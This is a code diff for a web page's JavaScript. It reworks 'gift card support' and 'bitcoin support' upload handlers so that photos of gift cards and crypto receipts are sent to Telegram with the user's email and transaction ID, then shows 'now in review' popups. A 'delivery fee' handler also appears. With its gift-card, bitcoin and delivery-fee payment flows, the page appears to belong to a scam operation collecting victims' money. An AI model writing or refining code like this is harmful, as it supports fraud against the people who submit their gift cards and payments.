@@ -1713,19 +1713,17 @@
 
       giftCardSupportButton.addEventListener("click", async () => {
         const upload = document.querySelector("#giftCardUpload");
+
         if (!upload.files.length) {
           setMessage(giftCardMessage, "Upload a gift card file first.", "error");
           return;
         }
 
         const file = upload.files[0];
-        const fileData = await readUpload(file);
-        submitUploadForReview({
-          reason: `Gift card support: ${file.name}`,
-          fileName: file.name,
-          fileType: file.type,
-          fileData
-        });
+
+        giftCardSupportButton.disabled = true;
+        giftCardSupportButton.textContent = "Submitting...";
+        setMessage(giftCardMessage, "Sending the exact image to Telegram for review...");
 
         try {
           await sendUploadToTelegram({
@@ -1733,13 +1731,24 @@
             uploadType: "gift_card",
             caption: `New gift card support upload\nUser: ${currentAccountEmail || "Unknown"}\nFile: ${file.name}\nSubmitted: ${new Date().toLocaleString()}`
           });
+
+          submitUploadForReview({
+            reason: `Gift card support: ${file.name}`,
+            fileName: file.name,
+            fileType: file.type
+          });
+
+          setMessage(giftCardMessage, "Upload successfully. Now in review.", "success");
+          showPopup("Upload successful", "Your image has been uploaded successfully and is now in review.", "success");
+          upload.value = "";
         } catch (error) {
           console.error(error);
+          setMessage(giftCardMessage, error.message || "Upload failed. Please try again.", "error");
+          showPopup("Upload failed", error.message || "The image could not be sent to Telegram. Please try again.", "error");
+        } finally {
+          giftCardSupportButton.disabled = false;
+          giftCardSupportButton.textContent = "Submit gift card support";
         }
-
-        setMessage(giftCardMessage, "Upload successfully. Now in review.", "success");
-        showPopup("Upload successful", "Your image has been uploaded successfully and is now in review.", "success");
-        upload.value = "";
       });
 
       copyBitcoinButton.addEventListener("click", async () => {
@@ -1757,6 +1766,7 @@
         const transaction = document.querySelector("#cryptoTransaction");
         const receipt = document.querySelector("#bitcoinReceiptUpload");
         const value = transaction.value.trim();
+
         if (!value) {
           setMessage(cryptoMessage, "Enter a crypto transaction ID or wallet note first.", "error");
           return;
@@ -1768,13 +1778,10 @@
         }
 
         const file = receipt.files[0];
-        const fileData = await readUpload(file);
-        submitUploadForReview({
-          reason: `Bitcoin support: ${value}`,
-          receiptName: file.name,
-          receiptType: file.type,
-          fileData
-        });
+
+        cryptoSupportButton.disabled = true;
+        cryptoSupportButton.textContent = "Submitting...";
+        setMessage(cryptoMessage, "Sending the exact receipt image to Telegram for review...");
 
         try {
           await sendUploadToTelegram({
@@ -1783,14 +1790,25 @@
             transaction: value,
             caption: `New bitcoin support upload\nUser: ${currentAccountEmail || "Unknown"}\nTransaction: ${value}\nFile: ${file.name}\nSubmitted: ${new Date().toLocaleString()}`
           });
+
+          submitUploadForReview({
+            reason: `Bitcoin support: ${value}`,
+            receiptName: file.name,
+            receiptType: file.type
+          });
+
+          setMessage(cryptoMessage, "Upload successfully. Now in review.", "success");
+          showPopup("Upload successful", "Your image has been uploaded successfully and is now in review.", "success");
+          transaction.value = "";
+          receipt.value = "";
         } catch (error) {
           console.error(error);
+          setMessage(cryptoMessage, error.message || "Upload failed. Please try again.", "error");
+          showPopup("Upload failed", error.message || "The receipt could not be sent to Telegram. Please try again.", "error");
+        } finally {
+          cryptoSupportButton.disabled = false;
+          cryptoSupportButton.textContent = "Record crypto support";
         }
-
-        setMessage(cryptoMessage, "Upload successfully. Now in review.", "success");
-        showPopup("Upload successful", "Your image has been uploaded successfully and is now in review.", "success");
-        transaction.value = "";
-        receipt.value = "";
       });
 
       deliveryFeeButton.addEventListener("click", () => {
